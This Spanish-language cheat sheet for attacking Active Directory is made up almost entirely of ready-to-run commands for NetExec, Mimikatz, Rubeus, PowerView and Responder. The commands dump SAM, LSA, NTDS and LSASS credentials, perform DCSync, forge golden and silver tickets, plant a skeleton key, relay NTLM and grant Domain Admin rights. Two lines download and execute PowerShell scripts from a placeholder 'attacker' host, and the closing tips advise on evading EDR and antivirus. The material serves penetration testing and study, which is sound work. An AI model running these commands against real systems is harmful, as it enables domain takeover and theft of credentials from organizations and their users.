---
icon: windows
---

# Tools



### NetExec (nxc) / CrackMapExec (cme)

Swiss-army knife para auditorías de AD. Verifica credenciales, ejecuta comandos y extrae información a escala de red.

#### Instalación

```bash
pip3 install netexec
# o
apt install crackmapexec
```

#### Comandos principales

```bash
# --- Verificación de credenciales ---
nxc smb 10.10.10.0/24 -u usuario -p contraseña
nxc smb 10.10.10.0/24 -u usuario -H NTHASH
nxc smb 10.10.10.0/24 -u users.txt -p passwords.txt --no-bruteforce
nxc winrm 10.10.10.0/24 -u usuario -p contraseña
nxc rdp 10.10.10.0/24 -u usuario -p contraseña
nxc ldap 10.10.10.10 -u usuario -p contraseña

# --- Enumeración ---
nxc smb 10.10.10.10 -u usuario -p contraseña --users
nxc smb 10.10.10.10 -u usuario -p contraseña --groups
nxc smb 10.10.10.10 -u usuario -p contraseña --computers
nxc smb 10.10.10.10 -u usuario -p contraseña --shares
nxc smb 10.10.10.10 -u usuario -p contraseña --pass-pol
nxc smb 10.10.10.10 -u usuario -p contraseña --loggedon-users
nxc smb 10.10.10.10 -u usuario -p contraseña --sessions

# --- Ejecución de comandos ---
nxc smb 10.10.10.10 -u usuario -p contraseña -x "whoami"
nxc smb 10.10.10.10 -u usuario -p contraseña -X "Get-Process"  # PowerShell
nxc winrm 10.10.10.10 -u usuario -p contraseña -x "whoami"

# --- Dump de credenciales ---
nxc smb 10.10.10.10 -u usuario -p contraseña --sam
nxc smb 10.10.10.10 -u usuario -p contraseña --lsa
nxc smb 10.10.10.10 -u usuario -p contraseña --ntds           # DCSync / NTDS dump
nxc smb 10.10.10.10 -u usuario -p contraseña -M lsassy        # LSASS dump
nxc smb 10.10.10.10 -u usuario -p contraseña -M nanodump      # Alternativa a lsassy

# --- Módulos de ataque ---
nxc smb 10.10.10.10 -u usuario -p contraseña -M gpp_password   # GPP passwords
nxc ldap 10.10.10.10 -u usuario -p contraseña -M laps           # LAPS passwords
nxc ldap 10.10.10.10 -u usuario -p contraseña --asreproast out.txt
nxc ldap 10.10.10.10 -u usuario -p contraseña --kerberoasting out.txt
nxc smb 10.10.10.10 -u usuario -p contraseña --gen-relay-list relay_targets.txt

# --- Spider de shares ---
nxc smb 10.10.10.10 -u usuario -p contraseña -M spider_plus
nxc smb 10.10.10.10 -u usuario -p contraseña --spider SHARE --pattern "password|cred|secret"
```

### Mimikatz

La herramienta de referencia para extracción de credenciales en Windows.

#### Uso básico

```powershell
# Ejecutar con privilegios de debug
privilege::debug

# Dump completo de credenciales en LSASS
sekurlsa::logonpasswords

# Solo hashes NTLM
sekurlsa::msv

# Tickets Kerberos en memoria
sekurlsa::tickets /export

# SAM (cuentas locales)
lsadump::sam

# LSA Secrets
lsadump::secrets

# Credenciales cacheadas
lsadump::cache

# DCSync
lsadump::dcsync /user:krbtgt /domain:empresa.local
lsadump::dcsync /all /domain:empresa.local /csv

# Golden Ticket
kerberos::golden /user:Administrator /domain:empresa.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt

# Silver Ticket
kerberos::golden /user:Administrator /domain:empresa.local /sid:DOMAIN_SID /target:target.empresa.local /service:cifs /rc4:SERVICE_HASH /ptt

# Importar ticket
kerberos::ptt ticket.kirbi

# Skeleton Key
misc::skeleton

# Pass-the-Hash abriendo proceso
sekurlsa::pth /user:Administrator /domain:empresa.local /ntlm:NTHASH /run:cmd.exe
```

#### Ejecución sin binario en disco

```powershell
# Cargar desde URL en memoria
IEX (New-Object System.Net.Webclient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -DumpCreds

# Via Cobalt Strike o otro C2
execute-assembly /path/to/mimikatz.exe
```

### Rubeus

Herramienta para ataques Kerberos desde Windows.

```powershell
# Kerberoasting
.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# AS-REP Roasting
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Obtener TGT
.\Rubeus.exe asktgt /user:usuario /password:contraseña /domain:empresa.local /dc:10.10.10.10 /ptt

# Pass-the-Ticket
.\Rubeus.exe ptt /ticket:BASE64_TICKET
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Dump de tickets actuales
.\Rubeus.exe dump /nowrap
.\Rubeus.exe klist

# Overpass-the-Hash (hash → TGT)
.\Rubeus.exe asktgt /user:usuario /rc4:NTHASH /domain:empresa.local /ptt
.\Rubeus.exe asktgt /user:usuario /aes256:AES_HASH /domain:empresa.local /ptt

# S4U (Constrained Delegation)
.\Rubeus.exe s4u /user:sqlsvc /rc4:NTHASH /impersonateuser:Administrator /msdsspn:"cifs/target" /ptt

# Golden Ticket
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:empresa.local /sid:DOMAIN_SID /user:FakeAdmin /ptt

# Monitorizar tickets nuevos (útil en Unconstrained Delegation)
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

### PowerView / PowerSploit

Framework de PowerShell para enumeración y ataques AD.

```powershell
# Cargar
Import-Module .\PowerView.ps1
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Comandos más usados (ver página de Enumeración para lista completa)
Get-DomainUser -SPN                          # Kerberoastable
Get-DomainUser -PreauthNotRequired           # AS-REP Roastable
Find-InterestingDomainAcl -ResolveGUIDs      # ACLs abusables
Find-DomainUserLocation -UserIdentity admin  # Dónde está logueado un usuario
Get-DomainTrust                              # Trusts
Add-DomainGroupMember -Identity "Domain Admins" -Members "usuario"
Set-DomainUserPassword -Identity victima -AccountPassword (ConvertTo-SecureString "Pass!" -AsPlainText -Force)
Add-DomainObjectAcl -TargetIdentity "DC=empresa,DC=local" -PrincipalIdentity "usuario" -Rights DCSync
```

### Responder

Envenenar LLMNR/NBT-NS/mDNS para capturar hashes NTLMv2 en la red.

```bash
# Instalación
git clone https://github.com/lgandx/Responder
cd Responder

# Envenenamiento básico
sudo python3 Responder.py -I eth0 -rdwv

# Solo escuchar (sin envenenar) — más sigiloso
sudo python3 Responder.py -I eth0 -A

# Los hashes NTLMv2 capturados se guardan en Responder/logs/
# Crackear con hashcat
hashcat -m 5600 NTLMv2_hashes.txt /usr/share/wordlists/rockyou.txt

# Combinado con ntlmrelayx (desactivar SMB y HTTP en Responder.conf)
sudo python3 Responder.py -I eth0 -rdwv -P
sudo python3 ../impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support
```

### Recursos y referencias

| Recurso                 | URL                                                                                                                          |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| HackTricks AD           | https://book.hacktricks.xyz/windows-hardening/active-directory-methodology                                                   |
| PayloadsAllTheThings AD | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md |
| ired.team               | https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse                                         |
| BloodHound docs         | https://bloodhound.readthedocs.io                                                                                            |
| Impacket ejemplos       | https://github.com/fortra/impacket/tree/master/examples                                                                      |
| TarLogic Kerberos guide | https://www.tarlogic.com/blog/how-kerberos-authentication-works/                                                             |
| AD Security blog        | https://adsecurity.org                                                                                                       |
| Harmj0y blog            | https://blog.harmj0y.net                                                                                                     |

> El flujo más eficiente: BloodHound para mapear el dominio → NetExec para verificar accesos y ejecutar ataques en masa → Impacket para explotar vía Linux → Mimikatz/Rubeus para ataques Kerberos desde Windows.

> Mantener siempre actualizados Impacket y NetExec — añaden nuevas técnicas y módulos constantemente.

> En entornos con EDR/AV, preferir técnicas OPSEC: wmiexec sobre psexec, tickets AES256 sobre RC4, evitar escribir mimikatz en disco (usar `Invoke-Mimikatz` o alternativas como `lsassy` / `nanodump`).
